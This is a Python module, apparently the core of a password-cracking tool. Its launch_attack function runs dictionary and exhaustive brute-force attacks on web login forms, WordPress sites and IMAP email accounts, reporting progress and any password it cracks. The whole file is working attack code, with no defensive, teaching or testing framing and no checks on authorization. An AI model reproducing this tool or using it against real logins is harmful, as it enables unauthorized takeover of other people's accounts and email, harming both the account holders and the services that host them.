from app.web_attack import web_login_brute_force
from app.wordpress_cracker import wp_login_brute_force
from app.imap_cracker import imap_brute_force
from app.utils import load_wordlist
from app.form_parser import auto_detect_form_fields_and_success
from app.brute_force import brute_force

CHARSET = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()"
MIN_LEN = 4
MAX_LEN = 12

def launch_attack(mode, target_type, target, username, wordlist_path):
    wordlist = load_wordlist(wordlist_path) if wordlist_path else []

    def run_dictionary():
        total = len(wordlist)
        for i, password in enumerate(wordlist):
            if target_type == "Web Form":
                user_field, pass_field, _, _, success_check = auto_detect_form_fields_and_success(target)
                if web_login_brute_force(target, username, [password], user_field, pass_field, success_check):
                    yield (100, password)
                    return
            elif target_type == "WordPress":
                if wp_login_brute_force(target, username, [password]):
                    yield (100, password)
                    return
            elif target_type == "IMAP Email":
                if imap_brute_force(target, username, [password]):
                    yield (100, password)
                    return
            yield ((i + 1) * 100 / total, None)

        yield (100, None)

    def run_bruteforce():
        total_attempts = 0
        for _ in brute_force(target, username, CHARSET, MIN_LEN, MAX_LEN, count_only=True):
            total_attempts += 1

        for i, password in enumerate(brute_force(target, username, CHARSET, MIN_LEN, MAX_LEN)):
            if password:
                yield (100, password)
                return
            yield ((i + 1) * 100 / total_attempts, None)

        yield (100, None)

    if mode == "Dictionary":
        yield from run_dictionary()
    elif mode == "Brute-force":
        yield from run_bruteforce()
    elif mode == "Both":
        yield from run_dictionary()
        yield from run_bruteforce()
    else:
        yield (100, None)
